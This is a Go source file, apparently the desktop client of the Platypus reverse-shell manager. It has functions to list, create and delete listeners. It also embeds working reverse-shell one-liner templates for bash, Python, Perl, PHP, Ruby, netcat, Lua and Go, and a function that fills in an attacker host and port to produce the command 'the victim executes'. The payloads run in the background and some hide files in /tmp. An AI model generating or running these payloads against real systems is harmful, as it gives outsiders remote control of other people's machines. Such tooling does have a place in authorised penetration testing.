package app

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"

	"github.com/WangYihang/Platypus/desktop/internal/api"
)

// listServersResp is the shape of GET /api/server.
type listServersResp struct {
	Status bool `json:"status"`
	Msg    struct {
		Servers map[string]struct {
			api.Listener
			Clients        map[string]any `json:"clients"`
			TermiteClients map[string]any `json:"termite_clients"`
		} `json:"servers"`
	} `json:"msg"`
}

// ListListeners returns every TCPServer registered on the server, with a
// computed NumSessions = #plain + #termite clients.
func (a *App) ListListeners() ([]api.Listener, error) {
	c, err := a.client()
	if err != nil {
		return nil, err
	}
	body, err := c.Get(context.Background(), "/api/server", nil)
	if err != nil {
		return nil, err
	}
	var resp listServersResp
	if err := json.Unmarshal(body, &resp); err != nil {
		return nil, fmt.Errorf("parse /api/server: %w", err)
	}
	out := make([]api.Listener, 0, len(resp.Msg.Servers))
	for _, s := range resp.Msg.Servers {
		l := s.Listener
		l.NumSessions = len(s.Clients) + len(s.TermiteClients)
		out = append(out, l)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Hash < out[j].Hash })
	return out, nil
}

// CreateListener spawns a new reverse-shell listener on the server.
// POST /api/server is form-encoded (legacy contract).
func (a *App) CreateListener(host string, port int, encrypted bool) error {
	c, err := a.client()
	if err != nil {
		return err
	}
	form := url.Values{}
	form.Set("host", host)
	form.Set("port", strconv.Itoa(port))
	form.Set("encrypted", strconv.FormatBool(encrypted))
	_, err = c.PostRaw(
		context.Background(),
		"/api/server",
		"application/x-www-form-urlencoded",
		[]byte(form.Encode()),
	)
	return err
}

// DeleteListener tears down a listener by hash.
func (a *App) DeleteListener(hash string) error {
	c, err := a.client()
	if err != nil {
		return err
	}
	_, err = c.Delete(context.Background(), "/api/server/"+url.PathEscape(hash))
	return err
}

// raasTemplates mirrors internal/utils/raas/templates/*.tpl on the server.
// Kept inline here so the desktop module doesn't need a cross-module
// dependency on the server source. Update both if the server templates change.
var raasTemplates = map[string]string{
	"bash":    `/usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1 &' >/dev/null`,
	"python":  `/usr/bin/nohup /bin/bash -c 'python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
	"python2": `/usr/bin/nohup /bin/bash -c 'python2 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
	"python3": `/usr/bin/nohup /bin/bash -c 'python3 -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("__HOST__",__PORT__));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);import os; os.system("/bin/bash")'\'' &' >/dev/null`,
	"perl":    `/usr/bin/nohup /bin/bash -c 'perl -e '\''use Socket;$i="__HOST__";$p=__PORT__;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");system("/bin/bash -i");};'\'' &' >/dev/null`,
	"php":     `/usr/bin/nohup /bin/bash -c 'php -r '\''$sock=fsockopen("__HOST__",__PORT__);shell_exec("/bin/bash -i <&3 >&3");'\'' &' >/dev/null`,
	"ruby":    `/usr/bin/nohup /bin/bash -c "ruby -rsocket -e 'exec(\"/bin/bash\",\"-c\",\"/bin/bash -i >/dev/tcp/__HOST__/__PORT__ 0>&1\");' &" >/dev/null`,
	"nc":      `/usr/bin/nohup /bin/bash -c "mkfifo /tmp/.platypus;nc __HOST__ __PORT__ 0</tmp/.platypus | /bin/bash | tee /tmp/.platypus &" >/dev/null`,
	"lua":     `/usr/bin/nohup /bin/bash -c 'lua -e "require('\''socket'\'').connect('\''__HOST__'\'','\''__PORT__'\'');require('\''os'\'').execute('\''/bin/bash -i <&3 >&3'\'');" &' >/dev/null`,
	"go":      `/usr/bin/nohup /bin/bash -c "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"__HOST__:__PORT__\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/platypus.go && go run /tmp/platypus.go && rm /tmp/platypus.go &" >/dev/null`,
}

// AvailableRaasLanguages returns the language keys (sorted) the
// frontend can pass to GenerateRaasOneliner.
func (a *App) AvailableRaasLanguages() []string {
	out := make([]string, 0, len(raasTemplates))
	for k := range raasTemplates {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// GenerateRaasOneliner builds the one-line shell command the victim
// executes to call back to the listener. listenerHostPort should be
// "host:port" (e.g. "1.2.3.4:13337"). Unknown languages fall back to bash.
func (a *App) GenerateRaasOneliner(listenerHostPort, lang string) string {
	host, port := splitHostPort(listenerHostPort)

	tpl, ok := raasTemplates[lang]
	if !ok {
		tpl = raasTemplates["bash"]
	}
	out := strings.ReplaceAll(tpl, "__HOST__", host)
	out = strings.ReplaceAll(out, "__PORT__", port)
	return out
}

// splitHostPort splits "h:p" into host and port; returns sensible defaults
// if the input is malformed.
func splitHostPort(in string) (string, string) {
	if i := strings.LastIndex(in, ":"); i >= 0 {
		return in[:i], in[i+1:]
	}
	return in, "13337"
}
